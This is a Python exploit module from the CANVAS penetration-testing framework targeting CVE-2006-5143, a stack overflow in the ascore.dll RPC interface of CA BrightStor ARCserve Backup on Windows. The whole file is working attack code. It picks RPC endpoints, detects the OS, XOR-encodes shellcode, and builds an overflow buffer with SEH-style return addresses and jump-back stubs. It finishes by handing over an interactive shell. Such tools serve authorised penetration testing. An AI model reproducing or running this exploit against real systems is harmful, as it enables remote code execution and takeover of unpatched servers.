#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')
import struct

from exploitutils import *
from msrpcexploit import msrpcexploit
from MOSDEF import mosdef

# GUI info
NAME='CA BrightStor ARCserve Backup RPC Interface Overflow'
DESCRIPTION='CA BrightStor ARCserve Backup RPC Interface ascore.dll Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Computer Associates"
DOCUMENTATION['Date public']='10/05/06'
DOCUMENTATION['References']='http://dvlabs.tippingpoint.com/advisory/TPTI-06-11'
DOCUMENTATION['Platforms Tested']=''
DOCUMENTATION['Notes']=''
DOCUMENTATION['CVE Name'] = 'CVE-2006-5143'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5143'
DOCUMENTATION['CVSS'] = 7.5


VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']

CHANGELOG="""
KK 08/14/07:
- Rewritten
"""

NOTES="""
CA BrightStor ARCserv Backup r11.5 offers a couple of RPC interface that can be reached
through the following endpoints:
- ncacn_np:HOST[\\ascore]
- ncacn_np:HOST[\\asdbapi]
- ncacn_ip_tcp:HOST[6503]
- ncacn_ip_tcp:HOST[6504]

The 1st RPC interface is dc246bf0-7a7a-11ce-9f88-00805fe43838 v1.0 located in ASCORE.dll,
the 2nd one is 506b1890-14c8-11d1-bbc3-00805fa6962e v1.0 located in ASDBAPI.dll.
Each one counts a lot of functions, most of them being vulnerable to various flaws, from
regular stack overflow to more complicated heap overflows.

This exploit targets a reliable exploitation vector through opnum 1.

Tested on:
Windows 2000 Server SP4 English OOTB with CA BrightStor ARCserv Backup r11.5
Windows 2000 Server SP4 English OOTB with CA BrightStor ARCserv Backup r11.5SP1
"""

targets={
    0: ['Autoversioning',0,0],
    1: ['CA BrightStor ARCserve Backup r11.0, r11.5 and r11.5SP1',[0x6d682cdf,0x6d501020]], #pop&pop&ret @ albuild.dll
}


class theexploit(msrpcexploit):

    def __init__(self):
        msrpcexploit.__init__(self)
        self.name           = NAME
        self.setInfo(DESCRIPTION)
        self.version        = 0
        self.badstring      = '\0'
        self.UUID           = u'dc246bf0-7a7a-11ce-9f88-00805fe43838'
        self.uuidversion    = u'1.0'
        self.targetfunction = 1

    def buildConnectionList(self):
        host=self.host
        connectionList=['ncacn_np:%s[\\ascore]'%(host),\
                        'ncacn_np:%s[\\asdbapi]'%(host),\
                        'ncacn_ip_tcp:%s[%d]'%(host,self.port),\
                        'ncacn_ip_tcp:%s[6503]'%host,\
                        'ncacn_ip_tcp:%s[6504]'%host]
        connectionList+=self.searchifids()
        connectionList=uniquelist(connectionList)
        self.connectionList=connectionList
        return self.connectionList

    def testOS(self):
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        self.log('target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        if app.result.find('NT 4.0')>-1:
            self.version=1
            self.log('OS vulnerable: %s'%(result))
            return 1
        elif app.result.find('2000')>-1:
            self.version=1
            self.log('OS vulnerable: %s'%(result))
            return 1
        elif app.result.find('XP')>-1:
            self.version=1
            self.log('OS vulnerable: %s'%(result))
            return 1
        elif app.result.find('2003')>-1:
            self.version=1
            self.log('OS vulnerable: %s'%(result))
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def s_dce_string(self,mystr): #put that into msrpc.py some day
        ret=''
        if len(mystr)==0 or mystr[-1]!='\0':
            mystr+='\0' #add null byte
        size=len(mystr)
        ret+=struct.pack('<LLL',size,0,size)
        ret+=mystr
        while (len(ret)%4)!=0:
            ret+='\0' #padding
        return ret

    def encodeshellcode(self, rawshellcode):
        from encoder import xorencoder
        encoder=xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        ret=encoder.find_key(rawshellcode)
        if ret==0:
            self.log('Could not find a key for this shellcode!')
            raise Exception,'No shellcode generated'
        self.shellcode=encoder.encode(rawshellcode)
        if self.shellcode=='':
            raise Exception,'No shellcode generated'
        self.log('Xor key used: %x'%(encoder.getkey()))
        self.log('Length of shellcode=%d'%(len(self.shellcode)))
        print repr(self.shellcode[:16])
        return self.shellcode

    def buildDcePacket(self):
        self.info,self.eip=targets[self.version]
        data=''
        data+=self.shellcode #check shellcode length!
        data+='A'*(0x2c4-len(data))
        data+='\xeb\x06'
        data+='BB'
        data+=struct.pack('<L',self.eip[1]) #r11.5
        data+=mosdef.assemble('jmp $-%d'%(len(data)+5),'x86') #jmp back
        data+='C'*(0x809-len(data))
        data+='\xeb\x06'
        data+='DD'
        data+=struct.pack('<L',self.eip[0]) #r11.0
        data+=mosdef.assemble('jmp $-%d'%(len(data)+5),'x86') #jmp back
        data+='E'*(0x1100-len(data)) #access violation
        packet=''
        packet+=self.s_dce_string(data)
        packet+=intel_order(0)
        packet+=self.s_dce_string('')
        return packet

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
